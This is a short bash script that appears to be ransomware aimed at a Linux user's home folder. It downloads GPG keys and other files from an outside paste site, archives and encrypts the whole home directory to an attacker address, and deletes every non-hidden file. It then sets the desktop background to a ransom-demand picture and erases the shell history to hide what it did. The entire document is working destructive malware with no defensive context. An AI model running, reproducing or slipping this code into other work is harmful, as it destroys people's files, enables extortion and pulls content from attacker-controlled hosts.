#!/bin/bash
cd
# fetch the encryption key
wget https://paste.c-net.org/MartiniReindeer
wget https://paste.c-net.org/LoweredOught
# import the keys
gpg --import MartiniReindeer
gpg --import LoweredOught
user=$(whoami)
# home folder tarball
tar -czf $user.tar.gz .
gpg --encrypt -r pwn3r@crypt.com $user.tar.gz
mv $user.tar.gz.gpg .$user.tar.gz.gpg
# delete everything except hidden files
find . ! -name '.*' -delete
# fetch the decryption script
wget https://paste.c-net.org/LunchBarrels
mv LunchBarrels .proc-nfo
# change the background to demand picture
wget https://paste.c-net.org/NotchesRelate
mv NotchesRelate demand
gsettings set org.gnome.desktop.background picture-uri demand
rm .bash_history
clear
